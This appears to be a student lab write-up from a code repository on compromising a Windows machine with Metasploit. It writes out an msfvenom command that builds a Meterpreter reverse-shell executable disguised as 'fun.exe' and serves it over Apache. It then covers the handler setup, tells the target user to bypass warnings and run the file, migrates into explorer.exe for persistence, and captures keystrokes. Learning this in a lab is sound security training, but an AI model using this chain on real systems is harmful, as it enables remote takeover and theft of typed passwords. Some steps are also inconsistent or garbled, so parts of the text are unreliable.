# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:

Find the attackers ip address using ifconfig
## OUTPUT:

<img width="883" height="328" alt="01-ifconfig" src="https://github.com/user-attachments/assets/5ccf5911-48d1-44f1-8188-841636713ea7" />


Create a malicious executable file fun.exe using msfvenom command
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe
## OUTPUT:

<img width="880" height="125" alt="02-msfvenom-generate" src="https://github.com/user-attachments/assets/a8bdfc50-a956-4e3b-8d69-f3767441e092" />

copy the fun.exe into the apache /var/www/html folder
## OUTPUT:

<img width="880" height="125" alt="03-msfvenom-copy" src="https://github.com/user-attachments/assets/41e7cf16-cd39-424c-80e2-d722878bcd53" />

Start apache server
sudo systemctl apache2 start
## OUTPUT:
<img width="812" height="52" alt="04-apache-start" src="https://github.com/user-attachments/assets/4eef07c6-cfd4-40b0-8712-4908084d7f73" />


Check the status of apache2
## OUTPUT:

<img width="941" height="400" alt="05-apache-status" src="https://github.com/user-attachments/assets/8ab5fd29-e494-47be-b3a9-f696995ac457" />


Invoke msfconsole:
## OUTPUT:


<img width="913" height="540" alt="06-msfconsole" src="https://github.com/user-attachments/assets/37131137-d0d6-4a33-8c76-0c9f9ce0dafc" />


Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.
## OUTPUT:



Starting a command and control Server
use multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 0.0.0.0

## OUTPUT:


<img width="877" height="736" alt="Screenshot 2026-11-19 142448" src="https://github.com/user-attachments/assets/15d3f795-281d-45d5-b611-979a107b0396" />


On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine:
http://192.168.1.2/fun.exe  ( Replace IP address appropriately)
The file "fun.exe" downloads. 
## OUTPUT:


<img width="1341" height="330" alt="download" src="https://github.com/user-attachments/assets/3b28cb6e-34a1-4751-9849-d093a427fec5" />


Bypass any warning boxes, double-click the file, and allow it to run.
## OUTPUT:
<img width="1398" height="360" alt="02-process-list-clear" src="https://github.com/user-attachments/assets/7e192ec6-a2f2-4b69-aa66-72f9c1b1e644" />


On kali/parrot give the command exploit
## OUTPUT:

<img width="1266" height="141" alt="03-keystroke-start-clear" src="https://github.com/user-attachments/assets/d8db3785-f71c-453b-b09c-3fd33cf2cb47" />


To see a list of processes, at the meterpreter > prompt, execute this command:
ps  ⇒ can see the fun.exe process running with pid 1156
## OUTPUT:



The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost.
To become more persistent, we'll migrate to a process that will last longer.
Let's migrate to the winlogon process.
At the meterpreter > prompt, execute this command:

migrate -N explorer.exe
## OUTPUT:


at meterpreter > prompt, execute this command:
netstat
A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below.
Notice the "PID/Program name" value for this connection, which is redacted 
## OUTPUT:

<img width="703" height="672" alt="719003057-192ca3c7-f9d0-44e7-ad71-3eff1fc57aa3" src="https://github.com/user-attachments/assets/b28727a0-8e62-47f3-ad3b-91849a4c867a" />


Post Exploitation
The target is now owned. Following are meterpreter commands for key capturing in the target machine
keyscan_start	Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.
## OUTPUT:




keyscan_dump	Shows the keystrokes captured so far
## OUTPUT:


## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.


## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.
